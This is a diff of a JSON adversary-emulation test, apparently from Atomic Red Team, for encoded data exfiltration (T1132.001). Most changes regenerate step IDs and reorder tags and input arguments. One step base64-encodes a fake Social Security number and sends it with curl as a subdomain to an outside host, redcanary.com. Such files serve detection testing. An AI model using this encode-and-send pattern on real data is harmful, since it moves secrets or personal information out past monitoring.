@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "dfbd7418-3a6a-42a8-99bb-a029fada5255",
+      "id": "c30b87af-c847-49c9-bda2-d56502618b9f",
       "type": "execute-command",
       "data": {
         "command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "618eaa82-4abe-414b-ab24-06cdc346a59c",
+      "id": "a3149daf-15cb-40e7-ad1d-ebf9e8cfdf8f",
       "name": "Check dependency 1/1",
       "description": "Requires curl\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "2eebd217-18b9-4614-abd8-48951928dd67",
+      "id": "3b85d495-63c2-4a51-b8b3-f519ddff321d",
       "name": "Resolve dependency 1/1",
       "description": "Requires curl\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "376441cf-77c2-4b8e-9d99-bf89ba37d705",
+      "id": "c8574e8b-f835-4538-8063-5f17fac0f55f",
       "name": "Re-check dependency 1/1",
       "description": "Requires curl\n",
       "type": "execute-command",
@@ -51,42 +51,42 @@
   ],
   "flows": [
     {
-      "s": "618eaa82-4abe-414b-ab24-06cdc346a59c",
+      "s": "a3149daf-15cb-40e7-ad1d-ebf9e8cfdf8f",
       "p": "on-success",
-      "o": "dfbd7418-3a6a-42a8-99bb-a029fada5255"
+      "o": "c30b87af-c847-49c9-bda2-d56502618b9f"
     },
     {
-      "s": "618eaa82-4abe-414b-ab24-06cdc346a59c",
+      "s": "a3149daf-15cb-40e7-ad1d-ebf9e8cfdf8f",
       "p": "on-failure",
-      "o": "2eebd217-18b9-4614-abd8-48951928dd67"
+      "o": "3b85d495-63c2-4a51-b8b3-f519ddff321d"
     },
     {
-      "s": "2eebd217-18b9-4614-abd8-48951928dd67",
+      "s": "3b85d495-63c2-4a51-b8b3-f519ddff321d",
       "p": "on-success",
-      "o": "376441cf-77c2-4b8e-9d99-bf89ba37d705"
+      "o": "c8574e8b-f835-4538-8063-5f17fac0f55f"
     },
     {
-      "s": "376441cf-77c2-4b8e-9d99-bf89ba37d705",
+      "s": "c8574e8b-f835-4538-8063-5f17fac0f55f",
       "p": "on-failure",
-      "o": "dfbd7418-3a6a-42a8-99bb-a029fada5255"
+      "o": "c30b87af-c847-49c9-bda2-d56502618b9f"
     }
   ],
   "tags": [
-    "T1132.001",
-    "atomic-red-team"
+    "T1132",
+    "T1132.001"
   ],
   "input_arguments": [
-    {
-      "name": "destination_url",
-      "type": "url",
-      "description": "Destination URL to post encoded data.",
-      "value": "redcanary.com"
-    },
     {
       "name": "base64_data",
       "type": "string",
       "description": "Encoded data to post using fake Social Security number 111-11-1111.",
       "value": "MTExLTExLTExMTE="
+    },
+    {
+      "name": "destination_url",
+      "type": "url",
+      "description": "Destination URL to post encoded data.",
+      "value": "redcanary.com"
     }
   ]
 }
